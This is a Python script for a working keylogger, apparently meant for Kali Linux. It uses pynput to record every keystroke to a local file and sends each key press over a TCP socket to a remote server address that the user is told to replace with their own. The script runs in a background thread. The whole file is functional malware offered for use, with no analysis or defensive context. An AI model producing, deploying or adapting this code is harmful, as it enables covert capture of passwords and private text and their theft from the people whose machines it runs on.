#!/usr/bin/python3

# _*_ coding: utf-8 _*_
#tested on linux (Linux kali 6.5.0-kali2-amd64)


try:
    import threading,socket
    from pynput import keyboard
except:
    pass

# <-- Intializing global values -->

#replace the ip with your server's ip 
SERVER_ADDRESS = '192.168.29.54:9090'.split(':')
        
#keystroke record
class keylogger:
    def Keylogging(self):
        
        def on_key_release(key):
            try:            
                with open('keystrokes.txt','a+') as fh:
                    fh.write(f'{key.char}')
            except:
                with open('keystrokes.txt','a+') as fh:
                    key=str(key)

                    if key == 'Key.space':
                        fh.write(' ')

                    elif key == 'Key.shift' or key == 'Key.shift_r': 
                        pass
                    
                    elif key == 'Key.ctrl': 
                        fh.write('\nctrl + ')

                    elif key == 'Key.enter':
                        fh.write('\n')
                    
                    else:
                        fh.write(f'\n{key}\n')
        
        def on_key_press(key):
            server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            server.connect((SERVER_ADDRESS[0],int(SERVER_ADDRESS[-1])))
            server.send(str(key).encode())
            server.close()

        # Create listener objects
        with keyboard.Listener(on_press=on_key_press , on_release=on_key_release) as listener:
            listener.join()


if __name__=='__main__':
    try:
        #creating an object
        obj=keylogger()

        #implementing threading and daemon = True (to run it in background)
        t1 = threading.Thread(target=obj.Keylogging,daemon=True)
        t1.start() 
        t1.join()    
    
    except KeyboardInterrupt:
        pass
